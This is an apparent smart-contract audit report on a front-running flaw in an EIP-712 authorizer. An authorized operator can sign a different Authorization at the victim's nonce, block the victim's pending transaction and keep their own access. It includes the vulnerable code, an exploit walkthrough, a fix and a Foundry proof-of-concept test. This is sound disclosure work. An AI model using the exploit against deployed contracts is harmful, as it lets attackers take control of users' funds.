### Title
Authorized operator can front-run victim's pending EIP-712 authorization by signing a different `Authorization` struct at the same nonce - (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `Midnight.isAuthorized(authorizer, signer)` returns `true` for, without restricting what `authorized`/`isAuthorized` fields that delegate may sign. An attacker who is already an authorized operator of the victim can therefore craft a completely different `Authorization` struct (e.g., `authorized=attacker, isAuthorized=true`) at the victim's current nonce, sign it with their own key, and submit it first, consuming nonce N and permanently invalidating the victim's pending transaction.

### Finding Description
**Exact code path** — `src/periphery/EcrecoverAuthorizer.sol` lines 24–47:

```solidity
function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
    require(block.timestamp <= authorization.deadline, Expired());
    require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // (1)

    bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
    bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
    bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
    address signer = ecrecover(digest, signature.v, signature.r, signature.s);
    require(signer != address(0), InvalidSignature());
    require(
        signer == authorization.authorizer
            || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer), // (2)
        Unauthorized()
    );
    ...
    IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
}
``` [1](#0-0) 

**Root cause** — At check `(2)`, the contract accepts any signer that is already authorized by the victim in Midnight. The signature is over the full `Authorization` struct (including `authorized` and `isAuthorized`), but there is no restriction on what content an authorized delegate may sign. A delegate can therefore sign a struct with arbitrary `authorized`/`isAuthorized` values, not just the one the victim intended.

**Exploit flow:**

Preconditions:
- Victim calls `Midnight.setIsAuthorized(attacker, true, victim)` — attacker is an authorized operator.
- Victim calls `Midnight.setIsAuthorized(ecrecoverAuthorizer, true, victim)` — EcrecoverAuthorizer is authorized to act on victim's behalf.
- Victim signs and broadcasts `Authorization{authorizer=victim, authorized=someAddress, isAuthorized=X, nonce=0, deadline=D}` to the mempool.

Attack:
1. Attacker observes the pending transaction in the mempool.
2. Attacker constructs `maliciousAuth = Authorization{authorizer=victim, authorized=attacker, isAuthorized=true, nonce=0, deadline=far_future}`.
3. Attacker signs `maliciousAuth` with their own private key, producing `attackerSig`.
4. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(maliciousAuth, attackerSig)` with higher gas.

Execution:
- Line 25: `block.timestamp <= far_future` → passes.
- Line 26: `nonce[victim] == 0` → passes, nonce incremented to 1.
- Line 31: `ecrecover(...)` → returns `attacker`.
- Line 34: `IMidnight(MIDNIGHT).isAuthorized(victim, attacker) == true` → passes.
- Line 46–47: `Midnight.setIsAuthorized(attacker, true, victim)` executes — attacker is now (re-)authorized.

Victim's original transaction now hits `InvalidNonce()` at line 26 because nonce is already 1. [2](#0-1) [3](#0-2) 

**Why existing checks fail:**
- The nonce check (line 26) prevents replay of the same struct but does not prevent a *different* struct at the same nonce value.
- The `isAuthorized` check (line 34) is designed to allow relaying, but it does not constrain the content of the struct the delegate signs — any authorized operator can sign any `Authorization` struct for the victim. [4](#0-3) 

### Impact Explanation
The attacker consumes nonce N with attacker-chosen content, permanently invalidating the victim's pending signed authorization (it can never be submitted again). Simultaneously, the attacker installs themselves (or any address of their choosing) as an authorized operator in Midnight, granting full access to `withdraw`, `repay`, `setConsumed`, and `setIsAuthorized` on behalf of the victim. The most damaging sub-case: victim signs a revocation (`isAuthorized=false`) to remove the attacker; the attacker front-runs with `isAuthorized=true` at the same nonce, blocking the revocation via this path and re-entrenching their authorization.

### Likelihood Explanation
Preconditions are realistic: a victim who uses `EcrecoverAuthorizer` for gasless/relayed authorization must first authorize `EcrecoverAuthorizer` in Midnight, and may have previously authorized a third party (e.g., a keeper or relayer) as an operator. Any such operator becomes a potential attacker. Front-running is straightforward on any chain with a public mempool. The attack is repeatable: every time the victim broadcasts a new signed authorization, the attacker can consume the nonce first.

### Recommendation
Remove the delegate-signer path from `EcrecoverAuthorizer.setIsAuthorized`. The purpose of the contract is to allow the authorizer to sign off-chain and have anyone relay the transaction — the relay model does not require the signer to be anyone other than the authorizer themselves. Change line 33–36 to:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

This ensures nonce N can only be consumed by a message signed by the authorizer's own key, matching the invariant that "nonce N is consumed only by the authorizer's intended delegation." Authorized operators who need to act on behalf of a user should call `Midnight.setIsAuthorized` directly (they already have that capability). [2](#0-1) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH, IEcrecoverAuthorizer}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract FrontRunNonceTest is BaseTest {
    function testOperatorFrontRunsVictimNonce() public {
        address attacker = makeAddr("attacker");
        uint256 attackerKey = 0xA77AC4E2; // any key
        attacker = vm.addr(attackerKey);

        // Step 1: victim authorizes EcrecoverAuthorizer and attacker in Midnight
        vm.startPrank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        midnight.setIsAuthorized(attacker, true, borrower);
        vm.stopPrank();

        // Step 2: victim signs Authorization{authorized=lender, isAuthorized=true, nonce=0}
        Authorization memory victimAuth = Authorization({
            authorizer: borrower,
            authorized: lender,
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, victimAuth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[borrower], digest);
        Signature memory victimSig = Signature({v: v, r: r, s: s});

        // Step 3: attacker crafts different Authorization at same nonce=0, signs with own key
        Authorization memory maliciousAuth = Authorization({
            authorizer: borrower,
            authorized: attacker,
            isAuthorized: true,
            nonce: 0,                          // same nonce as victim's pending tx
            deadline: block.timestamp + 365 days
        });
        structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, maliciousAuth));
        digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (v, r, s) = vm.sign(attackerKey, digest);
        Signature memory attackerSig = Signature({v: v, r: r, s: s});

        // Step 4: attacker front-runs — submits first
        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(maliciousAuth, attackerSig);

        // Assert: attacker is now authorized, nonce consumed
        assertEq(midnight.isAuthorized(borrower, attacker), true);
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);

        // Assert: victim's intended authorization (lender) was NOT set
        assertEq(midnight.isAuthorized(borrower, lender), false);

        // Step 5: victim's pending tx now reverts with InvalidNonce
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);

        // Final state: lender never authorized, attacker entrenched
        assertEq(midnight.isAuthorized(borrower, lender), false);
        assertEq(midnight.isAuthorized(borrower, attacker), true);
    }
}
```

Expected assertions:
- `midnight.isAuthorized(borrower, attacker) == true` after attacker's front-run.
- `midnight.isAuthorized(borrower, lender) == false` — victim's intended delegation never executed.
- Second call to `ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig)` reverts with `InvalidNonce`.
